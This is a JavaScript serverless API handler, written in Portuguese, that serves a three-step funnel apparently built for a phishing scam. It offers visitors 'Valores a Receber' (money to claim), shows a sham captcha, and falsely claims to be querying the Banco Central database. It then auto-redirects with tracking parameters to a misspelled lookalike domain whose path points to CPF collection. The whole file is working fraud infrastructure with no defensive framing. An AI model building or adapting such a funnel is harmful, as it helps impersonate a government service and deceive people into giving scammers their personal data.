export default function handler(req, res) {
  // Habilita CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  // Trata requisições OPTIONS (pré-flight)
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  const { id } = req.query;

  const generateSessionId = () => {
    const timestamp = Date.now();
    const randomStr = Math.random().toString(16).substr(2, 14);
    return `quiz_${timestamp}_${randomStr}`;
  };

  if (id === "1") {
    return res.status(200).json({
      success: true,
      sessionId: generateSessionId(),
      step: {
        id: 1,
        type: "welcome",
        title: "Bem-vindo(a) ao Portal de Atendimento!",
        description: "Clique no botão abaixo para verificar se possui Valores Disponíveis.",
        button: {
          text: "VERIFICAR VALORES A RECEBER",
          action: "next"
        },
        icon: "check-circle",
        iconColor: "green"
      }
    });
  }

  if (id === "2") {
    return res.status(200).json({
      success: true,
      step: {
        id: 2,
        type: "captcha",
        title: "🤖 Confirme que você não é um robô",
        description: "",
        question: "Digite o número <span class='highlight-number'>47</span> abaixo:",
        input: {
          type: "number",
          placeholder: "Digite aqui",
          label: "",
          required: true,
          validation: {
            min: 1,
            max: 999
          }
        },
        button: {
          text: "VERIFICAR",
          action: "submit"
        },
        icon: "shield",
        iconColor: "blue",
        helpText: ""
      }
    });
  }

  if (id === "3") {
    const { userData } = req.body || {};
    const baseUrl = "https://consulltarvalores.icu/new/cpf/";

    // Monta os parâmetros da URL, se houver
    const queryString = userData?.urlParams
      ? new URLSearchParams(userData.urlParams).toString()
      : "";

    const redirectUrl = queryString
      ? `${baseUrl}?${queryString}`
      : baseUrl;

    return res.status(200).json({
      success: true,
      step: {
        id: 3,
        type: "loading",
        title: "✅ Verificação Aprovada!",
        description: "Você será redirecionado para o ambiente seguro da consulta.",
        loadingText: "Aguarde alguns segundos...",
        progressSteps: [
          "🔒 Verificação de segurança concluída",
          "📊 Acessando base de dados do Banco Central",
          "🔄 Transferindo parâmetros de rastreamento",
          "✅ Redirecionando para consulta..."
        ],
        autoRedirect: true,
        redirectDelay: 3000,
        icon: "loader",
        iconColor: "green"
      },
      userData: {
        verified: true
      },
      redirectUrl
    });
  }

  // Se o ID não for válido
  return res.status(400).json({
    success: false,
    error: "ID inválido."
  });
}
